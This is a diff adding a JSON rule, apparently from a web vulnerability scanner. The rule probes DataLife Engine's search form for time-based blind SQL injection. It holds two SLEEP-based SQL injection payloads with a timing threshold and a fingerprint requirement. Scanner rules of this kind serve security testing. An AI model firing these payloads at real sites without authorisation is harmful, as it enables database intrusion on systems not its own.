@@ -1,0 +1,14 @@
+﻿{
+ "id": "sqli-dle-search-time",
+ "engine": "dle",
+ "method": "POST",
+ "path": "/index.php?do=search",
+ "where": "post-form",
+ "body_tpl": "do=search&subaction=search&story={{p}}",
+ "payloads": ["test' AND SLEEP(5)-- -", "test' AND SLEEP(5) AND '1'='1"],
+ "match": {"type": "time", "value": 4.5},
+ "timeout": 25,
+ "require": "DataLife",
+ "score": 7,
+ "note": "слепая по времени в поиске DLE"
+}
